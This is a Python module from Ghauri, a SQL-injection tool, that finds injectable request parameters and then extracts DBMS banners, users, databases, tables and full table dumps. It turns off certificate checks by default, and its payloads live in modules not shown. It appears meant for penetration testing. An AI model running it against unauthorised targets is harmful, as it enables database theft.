#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
from ghauri.common.config import conf
from ghauri.common.session import session
from ghauri.extractor.common import target
from ghauri.extractor.advance import target_adv
from ghauri.core.extract import ghauri_extractor
from ghauri.logger.colored_logger import logger, set_level
from ghauri.core.tests import basic_check, check_injections
from ghauri.common.lib import (
    os,
    ssl,
    json,
    quote,
    urllib3,
    logging,
    collections,
    PAYLOAD_STATEMENT,
)
from ghauri.common.utils import (
    HTTPRequest,
    prepare_proxy,
    prepare_custom_headers,
    prepare_attack_request,
    check_boolean_responses,
    extract_injection_points,
    fetch_db_specific_payload,
    check_injection_points_for_level,
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def perform_injection(
    url="",
    data="",
    host="",
    header="",
    cookies="",
    headers="",
    referer="",
    user_agent="",
    level=1,
    verbosity=1,
    techniques="BT",
    requestfile="",
    flush_session=False,
    proxy=None,
    batch=False,
    force_ssl=False,
    timeout=30,
    delay=0,
    timesec=5,
    dbms=None,
    testparameter=None,
    retries=3,
    prefix=None,
    suffix=None,
    code=200,
    string=None,
    not_string=None,
    text_only=False,
    skip_urlencoding=False,
):
    verbose_levels = {
        1: logging.INFO,
        2: logging.DEBUG,
        3: logging.PAYLOAD,
        4: logging.TRAFFIC_OUT,
        5: logging.TRAFFIC_IN,
    }
    is_custom_point = False
    conf.skip_urlencoding = skip_urlencoding
    logger.start("starting")
    if not force_ssl:
        ssl._create_default_https_context = ssl._create_unverified_context
    if proxy:
        conf.proxy = proxy = prepare_proxy(proxy)
    verbose_level = verbose_levels.get(verbosity, logging.INFO)
    set_level(verbose_level, "")
    GhauriResponse = collections.namedtuple(
        "GhauriResponse",
        [
            "url",
            "data",
            "vector",
            "backend",
            "parameter",
            "headers",
            "base",
            "injection_type",
            "proxy",
            "filepaths",
            "is_injected",
            "is_multipart",
            "attack",
            "match_string",
            "vectors",
            "not_match_string",
            "code",
            "text_only",
        ],
    )
    levels = {2: "COOKIE", 3: "HEADER"}
    raw = ""
    if requestfile:
        logger.info(f"parsing HTTP request from '{requestfile}'")
        raw = "\n".join([i.strip() for i in open(requestfile) if i])
    if raw:
        req = HTTPRequest(raw)
        url = req.url
        headers = req.headers
        full_headers = req.raw_full_headers
        raw_cookies = req.raw_cookies
        data = req.body
        method = req.method
    else:
        if not url.startswith("http"):
            url = f"http://{url}" if not url.startswith("//") else f"http:{url}"
        req = prepare_custom_headers(
            host=host,
            header=header,
            cookies=cookies,
            headers=headers,
            referer=referer,
            user_agent=user_agent,
        )
        headers = req.headers
        full_headers = req.raw_full_headers
        raw_cookies = req.raw_cookies
        data = data
        if url and data:
            method = "POST"
        elif url and not data:
            method = "GET"
    obj = extract_injection_points(
        url=url, data=data, headers=full_headers, cookies=raw_cookies
    )
    custom_injection_in = obj.custom_injection_in
    if "COOKIE" in custom_injection_in:
        level = 2
    if "HEADER" in custom_injection_in:
        level = 3
    injection_points = obj.injection_points
    conf.is_multipart = is_multipart = obj.is_multipart
    conf.is_json = is_json = obj.is_json
    conf.text_only = text_only
    base = None
    is_asked = False
    is_mp_asked = False
    is_json_asked = False
    is_resumed = False
    is_dynamic = False
    possible_dbms = None
    is_error_based_injected = False
    is_connection_tested = False
    injection_types = []
    is_remaining_tests_asked = False
    sd = data
    if is_multipart:
        sd = data.encode("unicode_escape").decode("utf-8")
    filepaths = session.generate_filepath(
        url, flush_session=flush_session, method=method, data=sd
    )
    conf.filepaths = filepaths
    filepath = os.path.dirname(filepaths.logs)
    set_level(verbose_level, filepaths.logs)
    is_params_found = check_injection_points_for_level(level, injection_points)
    if not is_params_found:
        logger.critical(
            "no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')"
        )
        logger.end("ending")
        exit(0)
    for injection_type in list(injection_points.keys()):
        if custom_injection_in:
            question = "y"
            if "POST" in custom_injection_in:
                if not is_asked:
                    question = logger.read_input(
                        "custom injection marker ('*') found in POST body. Do you want to process it? [Y/n/q]",
                        batch=batch,
                        user_input="Y",
                    )
                    is_asked = True
            if "GET" in custom_injection_in:
                if not is_asked:
                    question = logger.read_input(
                        "custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q]",
                        batch=batch,
                        user_input="Y",
                    )
                    is_asked = True
            if "HEADER" in custom_injection_in or "COOKIE" in custom_injection_in:
                if not is_asked:
                    question = logger.read_input(
                        "custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q]",
                        batch=batch,
                        user_input="Y",
                    )
                    is_asked = True
            if question and question == "y":
                injection_types = custom_injection_in
        if level == 1 and not injection_types:
            injection_types = ["GET", "POST"]
        if level == 2 and not injection_types:
            injection_types = ["GET", "POST", "COOKIE"]
        if level == 3 and not injection_types:
            injection_types = ["GET", "POST", "COOKIE", "HEADER"]
        if injection_type in injection_types:
            if is_multipart and not is_mp_asked and injection_type == "POST":
                question_mp = logger.read_input(
                    "Multipart-like data found in POST body. Do you want to process it? [Y/n/q] ",
                    batch=batch,
                    user_input="Y",
                )
                is_mp_asked = True
            if is_json and not is_json_asked and injection_type == "POST":
                choice = logger.read_input(
                    "JSON data found in POST body. Do you want to process it? [Y/n/q] ",
                    batch=batch,
                    user_input="Y",
                )
                is_json_asked = True
            parameters = injection_points.get(injection_type)
            if testparameter:
                parameters = [i for i in parameters if i.get("key") in testparameter]
            for parameter in parameters:
                param_name = parameter.get("key")
                param_value = parameter.get("value")
                is_custom_injection_marker_found = bool(
                    "*" in param_name or "*" in param_value
                )
                if custom_injection_in and not is_custom_injection_marker_found:
                    logger.debug(
                        f"skipping '{injection_type}' parameter '{param_name}'..."
                    )
                    continue
                # if param_name.startswith("_"):
                #     if is_multipart:
                #         msg = f"ignoring (custom) {injection_type} parameter 'MULTIPART {param_name}'"
                #     else:
                #         msg = f"ignoring {injection_type} parameter '{param_name}'"
                #     logger.info(msg)
                #     continue
                if not is_connection_tested:
                    retval_check = basic_check(
                        url=url,
                        data=data,
                        headers=full_headers,
                        proxy=proxy,
                        timeout=timeout,
                        batch=batch,
                        parameter=parameter,
                        injection_type=injection_type,
                        is_multipart=is_multipart,
                        techniques=techniques.upper(),
                        is_json=is_json,
                    )
                    base = retval_check.base
                    conf.base = base
                    conf.text_only = is_dynamic = (
                        retval_check.is_dynamic if not text_only else text_only
                    )
                    possible_dbms = retval_check.possible_dbms
                    is_connection_tested = retval_check.is_connection_tested
                    is_resumed = retval_check.is_resumed
                if not is_resumed:
                    if custom_injection_in:
                        custom_point = custom_injection_in[-1]
                        if "HEADER" in custom_point:
                            msg = f"testing for SQL injection on (custom) {injection_type} parameter '{param_name} #1*'"
                        elif "COOKIE" in custom_point:
                            msg = f"testing for SQL injection on (custom) {injection_type} parameter '{param_name} #1*'"
                        elif param_name == "#1*" and "GET" in custom_point:
                            msg = f"testing for SQL injection on (custom) URI parameter '#1*'"
                        elif "GET" in custom_point and param_name != "#1*":
                            msg = f"testing for SQL injection on (custom) {injection_type} parameter '{param_name}'"
                        elif "POST" in custom_point:
                            if is_multipart:
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter 'MULTIPART {param_name}'"
                            elif is_json:
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter 'JSON {param_name}'"
                            else:
                                msg = f"testing for SQL injection on (custom) {injection_type} parameter '{param_name}'"
                    else:
                        if is_multipart:
                            msg = f"testing for SQL injection on (custom) {injection_type} parameter 'MULTIPART {param_name}'"
                        elif is_json:
                            msg = f"testing for SQL injection on (custom) {injection_type} parameter 'JSON {param_name}'"
                        else:
                            msg = f"testing for SQL injection on {injection_type} parameter '{param_name}'"
                    logger.info(msg)
                if possible_dbms:
                    techniques = f"E{techniques.upper()}"
                    if not dbms:
                        choice = logger.read_input(
                            f"it looks like the back-end DBMS is '{possible_dbms}'. Do you want to skip test payloads specific for other DBMSes? [Y/n] ",
                            batch=batch,
                            user_input="Y",
                        )
                        if choice == "y":
                            dbms = possible_dbms
                    if dbms and possible_dbms == dbms:
                        if not is_remaining_tests_asked:
                            choice = logger.read_input(
                                f"for the remaining tests, do you want to include all tests for '{possible_dbms}'? [Y/n] ",
                                batch=batch,
                                user_input="Y",
                            )
                            is_remaining_tests_asked = True
                            if choice == "n":
                                pass
                retval = check_injections(
                    base,
                    parameter,
                    url=url,
                    data=data,
                    proxy=proxy,
                    headers=full_headers,
                    injection_type=injection_type,
                    batch=batch,
                    is_multipart=is_multipart,
                    timeout=timeout,
                    delay=delay,
                    timesec=timesec,
                    dbms=dbms,
                    techniques=techniques.upper(),
                    possible_dbms=possible_dbms,
                    session_filepath=filepaths.session,
                    is_json=is_json,
                    retries=retries,
                    prefix=prefix,
                    suffix=suffix,
                    code=code if code != 200 else None,
                    string=string,
                    not_string=not_string,
                    text_only=conf.text_only,
                )
                if retval and retval.vulnerable:
                    backend = retval.backend
                    parameter = retval.parameter
                    match_string = retval.match_string
                    attack = retval.boolean_false_attack
                    injection_type = retval.injection_type
                    vectors = retval.vectors
                    conf.vectors = vectors
                    conf.is_string = retval.is_string
                    vector = vectors.get("error_vector")
                    if not vector:
                        vector = vectors.get("boolean_vector")
                    if not vector:
                        vector = vectors.get("time_vector")
                    return GhauriResponse(
                        url=url,
                        data=data,
                        vector=vector,
                        backend=backend,
                        parameter=parameter,
                        headers=full_headers,
                        base=base,
                        injection_type=injection_type,
                        proxy=proxy,
                        filepaths=filepaths,
                        is_injected=True,
                        is_multipart=is_multipart,
                        attack=attack,
                        match_string=match_string,
                        vectors=vectors,
                        code=code if code != 200 else None,
                        not_match_string=None,
                        text_only=conf.text_only,
                    )
    # end of injection
    logger.critical("all tested parameters do not appear to be injectable.")
    logger.end("ending")

    return GhauriResponse(
        url="",
        data="",
        vector="",
        backend="",
        parameter="",
        headers="",
        base="",
        injection_type="",
        proxy="",
        filepaths="",
        is_injected=False,
        is_multipart=False,
        attack=None,
        match_string=None,
        vectors={},
        code=None,
        not_match_string=None,
        text_only=None,
    )


class Ghauri:
    """This class will perform rest of data extraction process"""

    def __init__(
        self,
        url,
        data="",
        vector="",
        backend="",
        parameter="",
        headers="",
        base="",
        injection_type="",
        proxy="",
        filepaths=None,
        is_multipart=False,
        timeout=30,
        delay=0,
        timesec=5,
        attack=None,
        match_string=None,
        vectors=None,
        not_match_string=None,
        code=None,
        text_only=False,
    ):
        self.url = url
        self.data = data
        self.vector = vector
        self.backend = backend
        self.parameter = parameter
        self.headers = headers
        self.base = base
        self.injection_type = injection_type
        self.proxy = proxy
        self.is_multipart = is_multipart
        self.filepaths = filepaths
        self._filepath = filepaths.filepath
        self.timeout = timeout
        self.delay = delay
        self.timesec = timesec
        self._attack = attack
        self._match_string = match_string
        self._vectors = vectors
        self._not_match_string = not_match_string
        self._code = code
        self._text_only = text_only

    def __end(self, database="", table="", fetched=True):
        new_line = ""
        if database and table:
            filepath = os.path.join(conf.filepaths.filepath, "dump")
            filepath = os.path.join(filepath, database)
            filepath = os.path.join(filepath, f"{table}.csv")
            message = f"\ntable '{database}.{table}' dumped to CSV file '{filepath}'"
            logger.info(message)
            new_line = ""
        if fetched:
            logger.info(
                f"{new_line}fetched data logged to text files under '{self._filepath}'"
            )
            logger.end("ending")

    def extract_banner(self):
        response = target.fetch_banner(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
        )
        fetched = response.ok
        if fetched:
            logger.success("")
        self.__end(fetched=fetched)
        return response

    def extract_hostname(self):
        response = target.fetch_hostname(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
        )
        fetched = response.ok
        if fetched:
            logger.success("")
        self.__end(fetched=fetched)
        return response

    def extract_current_db(self):
        response = target.fetch_current_database(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
        )
        fetched = response.ok
        if fetched:
            logger.success("")
        self.__end(fetched=fetched)
        return response

    def extract_current_user(self):
        response = target.fetch_current_user(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
        )
        fetched = response.ok
        if fetched:
            logger.success("")
        self.__end(fetched=fetched)
        return response

    def extract_dbs(self, start=0, stop=None):
        response = target_adv.fetch_dbs(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
            start=start,
            stop=stop,
        )
        fetched = response.ok
        if not fetched:
            response = self.extract_current_db()
        if fetched:
            logger.success("")
        self.__end(fetched=fetched)
        return response

    def extract_tables(self, database="", start=0, stop=None, dump_requested=False):
        response = target_adv.fetch_tables(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
            start=start,
            stop=stop,
            database=database,
        )
        fetched = response.ok
        if fetched:
            logger.success("")
        else:
            logger.error("unable to retrieve the table names for any database")
            print("\n")
        if not dump_requested:
            self.__end(fetched=True)
        return response

    def extract_columns(
        self, database="", table="", start=0, stop=None, dump_requested=False
    ):
        response = target_adv.fetch_columns(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
            start=start,
            stop=stop,
            database=database,
            table=table,
        )
        fetched = response.ok
        if fetched:
            logger.success("")
        if not dump_requested:
            self.__end(fetched=fetched)
        return response

    def extract_records(
        self,
        database="",
        table="",
        columns="",
        start=0,
        stop=None,
        dump_requested=False,
    ):
        response = target_adv.dump_table(
            self.url,
            data=self.data,
            vector=self.vector,
            parameter=self.parameter,
            headers=self.headers,
            base=self.base,
            injection_type=self.injection_type,
            backend=self.backend,
            proxy=self.proxy,
            is_multipart=self.is_multipart,
            timeout=self.timeout,
            delay=self.delay,
            timesec=self.timesec,
            attack=self._attack,
            match_string=self._match_string,
            not_match_string=self._not_match_string,
            code=self._code,
            text_only=self._text_only,
            start=start,
            stop=stop,
            database=database,
            table=table,
            columns=columns,
        )
        fetched = response.ok
        if fetched:
            if not dump_requested:
                logger.success("")
                self.__end(database=database, table=table, fetched=fetched)
        else:
            if not dump_requested:
                self.__end(fetched=fetched)
        return response

    def dump_database(self, database="", start=0, stop=None, dump_requested=False):
        retval_tables = self.extract_tables(
            database=database,
            start=start,
            stop=stop,
            dump_requested=dump_requested,
        )
        if retval_tables.ok:
            for table in retval_tables.result:
                retval_columns = self.extract_columns(
                    database=database,
                    table=table,
                    start=start,
                    stop=stop,
                    dump_requested=dump_requested,
                )
                if retval_columns.ok:
                    retval_dump = self.extract_records(
                        database=database,
                        table=table,
                        columns=",".join(list(retval_columns.result)),
                        start=start,
                        stop=stop,
                        dump_requested=dump_requested,
                    )
                    if retval_dump.ok:
                        self.__end(database=database, table=table, fetched=False)
        self.__end(fetched=True)

    def dump_table(
        self, database="", table="", start=0, stop=None, dump_requested=False
    ):
        retval_columns = self.extract_columns(
            database=database,
            table=table,
            start=start,
            stop=stop,
            dump_requested=dump_requested,
        )
        if retval_columns.ok:
            retval_dump = self.extract_records(
                database=database,
                table=table,
                columns=",".join(list(retval_columns.result)),
                start=start,
                stop=stop,
                dump_requested=dump_requested,
            )
            if retval_dump.ok:
                self.__end(database=database, table=table, fetched=False)
        self.__end(fetched=True)
